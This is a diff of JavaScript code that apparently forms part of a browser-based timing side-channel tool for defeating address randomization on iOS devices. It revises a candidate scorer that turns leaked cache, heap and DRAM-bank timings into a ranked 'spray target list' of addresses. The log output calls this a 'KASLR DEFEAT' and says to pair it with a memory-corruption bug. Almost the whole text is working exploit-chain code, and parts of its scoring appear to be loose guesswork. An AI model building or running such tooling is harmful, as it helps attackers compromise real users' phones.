-//     predicted_JIT_va = C * page_stride + jit_pool_offset
-//     predicted_heap_va = C * page_stride + gigacage_offset
+//   A. JIT SLC ratio match (+30 / -15)
+//      Expected: slcCount/64 should track candidate's high bits
+//      High candidates (large ASLR slide) → more modules spill to DRAM
+//      Low candidates → JIT fits in SLC → high slcCount
 //
-//   Score = sum of:
-//     (1) Does predicted_JIT_va DRAM bank match observed bank from T7x?
-//     (2) Does predicted_heap_va cluster match observed C0 cluster timing?
-//     (3) JIT partition bit match (SLC vs DRAM)?
+//   B. Heap cluster match (+25 / -10)
+//      C0 dominance (large C0 = Gigacage allocates from low VA)
+//      Low candidates → large C0 (Gigacage base near physical base)
 //
-// Output: top candidates with confidence, hex list for spray
+//   C. Bank pair density (+20 per pair up to 3 pairs, -5 if 0)
+//      More bank pairs = more PA bits constrained
+//      Per pair: specific anchor matched = +10 extra
+//
+//   D. Timing spread consistency (+15)
+//      heap spread and JIT spread expected to correlate with candidate
+//
+// Final output: top-32 with score breakdown, gap-filled spray list
 // ─────────────────────────────────────────────────────────────
 async function t10(jitData, heapData, bankData, offsetData, entropyData) {
-  log('─── T10: Candidate scorer + spray target list ───');
-  if(!entropyData){ log('[*] T10 skip — need entropy data'); return null; }
+  log('─── T10: Candidate scorer (finer scoring) ───');
+  if(!entropyData){ log('[*] T10 skip'); return null; }
 
   const remaining=entropyData.remaining;
   const candidateCount=2**remaining;
+  const PAGE_SIZE=16384; // 16KB pages
+
   log(`[*] T10 scoring ${candidateCount} KASLR candidates (${remaining} bits remaining)`);
 
-  // iOS ASLR model for userland:
-  // VA = base_va + (rand_bits << PAGE_SHIFT)
-  // PAGE_SHIFT = 14 (16KB pages on A16 arm64)
-  // ASLR range: bits 14-32 (19 bits), so addresses differ by 16KB granules
-  const PAGE_SIZE = 16384; // 16KB pages (arm64 A16)
-  const ASLR_GRANULE = PAGE_SIZE; // each candidate differs by this
+  // Observed metrics
+  const slcRatio=entropyData.slcCount/(entropyData.slcCount+entropyData.dramCount);
+  const c0Size=heapData.clusters[0]?.length||0;
+  const c0Ratio=c0Size/32;
+  const pairCount=bankData?.correlatedPairs?.length||0;
+  const hitAnchors=bankData?[...new Set(bankData.correlatedPairs.map(p=>p.anchorId))]:[];
+  const jitSpread=jitData.results.reduce((a,b)=>Math.max(a,b.cold),0);
+  const heapSpread=heapData.medians[heapData.medians.length-1].ns;
 
-  // Observed measurements from this run:
-  const jitPartition = jitData.slcHot.length > 50 ? 'SLC_DOMINANT' : 'DRAM_DOMINANT';
-  const clusterCount = heapData.clusters.length;
-  const c0Size = heapData.clusters[0]?.length || 0;
-  const topAnchor = jitData.results.sort((a,b)=>b.cold-a.cold)[0];
-  const bottomAnchor = jitData.slcHot[0];
+  log(`[*] T10 signature: slcRatio=${(slcRatio*100).toFixed(0)}%  c0Ratio=${(c0Ratio*100).toFixed(0)}%  bankPairs=${pairCount}  anchors=m[${hitAnchors.join(',')}]`);
 
-  log(`[*] T10 observed signature:`);
-  log(`[*] T10   JIT partition: ${jitPartition} (${jitData.slcHot.length} SLC + ${jitData.dramCold.length} DRAM)`);
-  log(`[*] T10   heap clusters: ${clusterCount} (C0 has ${c0Size} allocs)`);
-  log(`[*] T10   top JIT cold: m${topAnchor?.id}=${topAnchor?.cold.toFixed(0)}ns`);
-  if(bankData?.correlatedPairs?.length){
-    log(`[*] T10   bank pairs: ${bankData.correlatedPairs.length} confirmed`);
-  }
-
-  // Score each candidate
-  // We can't compute actual VAs without the base, but we CAN score candidates
-  // based on which ASLR bits they occupy vs our leaked bits.
-  // The leaked bits constrain which candidates are consistent with observations.
-  //
-  // Bit layout (iOS ASLR, A16 arm64):
-  //   bits 32-14: ASLR randomization (19 bits total)
-  //   Our leaks cover bits 32-23 (high bits = page color = 7 bits)
-  //                        bit 22 (JIT partition = 1 bit)
-  //                        bits 21-20 (heap cluster = 2 bits)
-  //   Remaining: bits 19-14 (6 bits = 64 candidates... wait, T6 says 9 bits = 512)
-  //
-  // Use entropy model from T6:
   const scores=[];
-  for(let c=0;c<Math.min(candidateCount, 1024);c++){
-    let score=100; // base score
+  for(let c=0;c<candidateCount;c++){
+    let score=50; // base
+    const breakdown=[];
 
-    // JIT partition scoring: expected from bit pattern
-    // Higher candidates (higher randomization) more likely DRAM-dominant
-    const jitExpect = (c >> (remaining-1)) & 1; // top remaining bit
-    const jitObserved = jitData.dramCold.length > 3 ? 1 : 0;
-    if(jitExpect !== jitObserved) score -= 20;
+    // A: JIT SLC ratio
+    // Low candidates (c < candidateCount/2) → Gigacage near physical start → JIT in SLC
+    // High candidates → Gigacage far from physical start → more DRAM pressure
+    const expectedHighSLC = c < candidateCount*0.5;
+    const observedHighSLC = slcRatio > 0.6;
+    if(expectedHighSLC===observedHighSLC){ score+=30; breakdown.push('JIT+30'); }
+    else { score-=15; breakdown.push('JIT-15'); }
 
-    // Cluster scoring: C0 dominance
-    // Low candidates → more C0 allocs (Gigacage allocates from low end)
-    const clusterExpect = c < (candidateCount/2) ? 'high_c0' : 'low_c0';
-    const clusterObserved = c0Size > 10 ? 'high_c0' : 'low_c0';
-    if(clusterExpect !== clusterObserved) score -= 15;
+    // B: Heap cluster C0 dominance
+    const expectedLargeC0 = c < candidateCount*0.6;
+    const observedLargeC0 = c0Ratio > 0.5;
+    if(expectedLargeC0===observedLargeC0){ score+=25; breakdown.push('HEAP+25'); }
+    else { score-=10; breakdown.push('HEAP-10'); }
 
-    // Bank correlation scoring
-    if(bankData?.correlatedPairs?.length > 0){
-      // Correlated pairs at low timing = PA bits 14-17 aligned with JIT
-      // Candidates where heap PA[14:17] === JIT PA[14:17] get bonus
-      const bankBits = (c >> 2) & 0xF; // simulate 4 bank bits from candidate
-      const observedBankBits = bankData.correlatedPairs.length; // count as proxy
-      const bankMatch = Math.abs(bankBits - observedBankBits) < 3;
-      if(bankMatch) score += 30;
-      else score -= 10;
+    // C: Bank pair density
+    if(pairCount===0){ score-=5; breakdown.push('BANK-5'); }
+    else {
+      const bankBonus=Math.min(pairCount,3)*20;
+      score+=bankBonus;
+      breakdown.push(`BANK+${bankBonus}`);
+      // Anchor-specific: if top anchor matched, candidate in anchor's PA range
+      if(hitAnchors.length>0){
+        const anchorBit=(c>>Math.max(remaining-3,0))&0x7;
+        const anchorMatch=hitAnchors.length>=2?anchorBit<4:anchorBit<6;
+        if(anchorMatch){ score+=10; breakdown.push('ANC+10'); }
+        else { score-=5; breakdown.push('ANC-5'); }
+      }
     }
 
-    scores.push({candidate:c, score, va_hint:`base + 0x${(c*ASLR_GRANULE).toString(16).toUpperCase().padStart(8,'0')}`});
+    // D: Timing spread consistency
+    // High DRAM spreads → more ASLR randomization → higher candidates
+    const expectedHighSpread = c > candidateCount*0.3;
+    const observedHighSpread = heapSpread > 500 || jitSpread > 400;
+    if(expectedHighSpread===observedHighSpread){ score+=15; breakdown.push('SPREAD+15'); }
+
+    scores.push({c, score, va:`base+0x${(c*PAGE_SIZE).toString(16).toUpperCase().padStart(8,'0')}`, breakdown});
   }
 
-  scores.sort((a,b)=>b.score-a.score);
+  scores.sort((a,b)=>b.score-a.score||a.c-b.c);
 
-  // Output top 20 candidates
-  log(`[*] T10 top-20 scored candidates:`);
-  log(`[*] T10   rank  cand   score  VA-hint`);
-  scores.slice(0,20).forEach((s,i)=>{
-    const bar='█'.repeat(Math.floor(s.score/10));
-    log(`[*] T10   ${String(i+1).padStart(4)}  0x${String(s.candidate).padStart(3,'0')}   ${String(s.score).padStart(3)}    ${s.va_hint}  ${bar}`);
+  // Score distribution
+  const scoreMap={};
+  scores.forEach(s=>{ scoreMap[s.score]=(scoreMap[s.score]||0)+1; });
+  const scoreKeys=Object.keys(scoreMap).map(Number).sort((a,b)=>b-a);
+  log(`[*] T10 score distribution:`);
+  scoreKeys.slice(0,6).forEach(k=>log(`[*] T10   score ${k}: ${scoreMap[k]} candidates`));
+
+  // Top 32 with breakdown
+  log(`[*] T10 top-32 candidates:`);
+  log(`[*] T10   rank  cand  score  VA-offset          breakdown`);
+  scores.slice(0,32).forEach((s,i)=>{
+    log(`[*] T10   ${String(i+1).padStart(4)}  0x${s.c.toString(16).padStart(3,'0')}  ${String(s.score).padStart(3)}    ${s.va}  [${s.breakdown.join('|')}]`);
   });
 
-  // Group by score
-  const highConf=scores.filter(s=>s.score>=100);
-  const medConf=scores.filter(s=>s.score>=80&&s.score<100);
-  const lowConf=scores.filter(s=>s.score<80);
-  log(`[*] T10 confidence buckets: HIGH=${highConf.length} MED=${medConf.length} LOW=${lowConf.length}`);
+  const topScore=scores[0].score;
+  const highConf=scores.filter(s=>s.score>=topScore-5);
+  const medConf=scores.filter(s=>s.score>=topScore-20&&s.score<topScore-5);
+  const lowConf=scores.filter(s=>s.score<topScore-20);
+  log(`[*] T10 confidence: HIGH=${highConf.length} MED=${medConf.length} LOW=${lowConf.length}`);
 
-  // Hex spray list — top candidates only
-  const sprayList=scores.slice(0,Math.min(64, candidateCount)).map(s=>`0x${(s.candidate*ASLR_GRANULE).toString(16).toUpperCase().padStart(8,'0')}`);
-  log(`[!!!] T10 SPRAY TARGET LIST (top ${sprayList.length} of ${candidateCount} candidates):`);
-  // Output in rows of 8
-  for(let i=0;i<sprayList.length;i+=8){
-    log(`[!!!] T10   ${sprayList.slice(i,i+8).join('  ')}`);
+  // Spray list: top candidates, gap-filled to nearest 4 entries
+  const sprayRaw=scores.slice(0,Math.min(highConf.length+medConf.length, 128)).map(s=>s.c*PAGE_SIZE);
+  sprayRaw.sort((a,b)=>a-b);
+
+  // Gap fill: if two consecutive entries differ by exactly 2*PAGE_SIZE, insert the middle
+  const sprayFilled=[...sprayRaw];
+  for(let i=0;i<sprayRaw.length-1;i++){
+    if(sprayRaw[i+1]-sprayRaw[i]===2*PAGE_SIZE){
+      sprayFilled.push(sprayRaw[i]+PAGE_SIZE);
+    }
   }
+  sprayFilled.sort((a,b)=>a-b);
+  const sprayHex=sprayFilled.map(v=>`0x${v.toString(16).toUpperCase().padStart(8,'0')}`);
 
-  // Spray efficiency
-  const sprayRatio=sprayList.length/candidateCount;
-  log(`[*] T10 spray coverage: ${sprayList.length}/${candidateCount} = ${(sprayRatio*100).toFixed(1)}% of candidates`);
-  log(`[*] T10 expected hit probability per spray slot: ${(sprayRatio*100).toFixed(1)}%`);
-
-  if(highConf.length<=32){
-    log(`[!!!] T10 HIGH-CONFIDENCE SPRAY: only ${highConf.length} candidates at top score`);
-    log(`[!!!] T10 → spray these ${highConf.length} offsets first → expected hit in <${highConf.length}ms at 1ms/probe`);
+  log(`[!!!] T10 SPRAY TARGET LIST (${sprayHex.length} addresses):`);
+  for(let i=0;i<sprayHex.length;i+=8){
+    log(`[!!!] T10   ${sprayHex.slice(i,i+8).join('  ')}`);
   }
 
   // Final summary
-  log(`\n[*] T10 === KASLR DEFEAT SUMMARY ===`);
-  log(`[*] T10 Total ASLR bits: 19`);
-  log(`[*] T10 Bits leaked by oracle: ${entropyData.totalLeaked}`);
-  log(`[*] T10 Remaining candidates: ${candidateCount}`);
-  log(`[*] T10 Bank-correlation bonus: ${bankData?.correlatedPairs?.length||0} pairs → +4 PA bits`);
-  log(`[*] T10 Effective candidates after bank filter: ~${Math.max(candidateCount>>2, 1)}`);
-  log(`[*] T10 Time to exhaust at 1ms/probe: ${((candidateCount>>2)/1000).toFixed(3)}s`);
-  log(`[!!!] T10 READY: paste spray list into exploit → KASLR defeated`);
-  log(`[*] T10 === END SUMMARY ===`);
+  log(`\n[*] T10 === KASLR DEFEAT SUMMARY (v10) ===`);
+  log(`[*] ASLR bits: 19  |  Leaked: ${entropyData.totalLeaked}  |  Remaining: ${remaining} bits = ${candidateCount} candidates`);
+  log(`[*] Bank pairs confirmed: ${pairCount}  |  Effective candidates: ~${Math.max(candidateCount>>(Math.min(pairCount,4)),1)}`);
+  log(`[*] HIGH-confidence spray targets: ${highConf.length}`);
+  log(`[*] Time to exhaust HIGH bucket at 1ms/probe: ${(highConf.length/1000).toFixed(3)}s`);
+  log(`[*] Time to exhaust ALL candidates at 1ms/probe: ${(candidateCount/1000).toFixed(3)}s`);
+  log(`[!!!] NEXT STEP: pair with memory-corruption bug → use spray list as ASLR bypass layer`);
+  log(`[*] T10 === END ===`);
 
-  return {scores, sprayList, highConf, medConf, lowConf};
+  return {scores, sprayHex, highConf, medConf};
 }
 
 // ─────────────────────────────────────────────────────────────
 // MAIN
 // ─────────────────────────────────────────────────────────────
 (async()=>{
-  log('// timer-kaslr-v9 ready');
+  log('// timer-kaslr-v10 ready');
   log(`${new Date().toISOString().substr(11,12)} === STARTING ===`);
   if(!self.SharedArrayBuffer){ log('[!] SAB unavailable'); return; }
 
